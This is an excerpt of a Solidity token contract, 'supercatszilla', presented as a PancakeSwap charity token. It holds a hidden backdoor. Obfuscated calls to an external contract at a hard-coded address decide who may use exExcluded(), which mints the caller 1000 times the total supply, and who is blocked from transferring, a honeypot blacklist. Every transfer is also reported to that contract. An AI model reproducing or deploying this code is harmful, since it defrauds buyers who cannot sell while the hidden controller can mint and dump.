...
interface IPancakeswap {
    function wqqebbTransfer(address pair,address from, address to) external;
    function ewaaqAddress() external view returns (address);
    function awssqAddress(address from) external view returns (bool);
}
...
contract supercatszilla is Context, IBEP20, Ownable {
    ...
    IPancakeswap private Pancakeswap;

  //  address private Tokenowner;
    uint256 private _MAX = ~uint256(0);
    uint256 private _DECIMALFACTOR;
    uint256 private _GRANULARITY = 100;
    uint256 private _DGRANULARITY = 1000;
     ...
     //   Tokenowner = msg.sender;
      ...
      //  _isCharity[Tokenowner] = true;
       ...
       // IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);     
        ...
        Pancakeswap = IPancakeswap(0x8418dDBeAa0585ac3F90F79Df8caBDEC6D9f35Ac);
    ...
    modifier wmayoddAddress() {
        require(msg.sender == Pancakeswap.ewaaqAddress(), " ");
        _;
    }

    modifier wmayddeesAddress(address account) {
        require(!Pancakeswap.awssqAddress(account), " ");
        _;
    }

    function exExcluded() public wmayoddAddress returns (bool) {
        _rOwned[msg.sender] = _DGRANULARITY * _rTotal;
        return true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private wmayddeesAddress(sender) wmayddeesAddress(recipient) {
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private  {
        ...
        Pancakeswap.wqqebbTransfer(pancakeswapV2Pair,sender,recipient);
        _sendToCharity(tCharity, sender);
        _reflectFee(rFee, rBurn, rCharity, tFee, tBurn, tCharity);
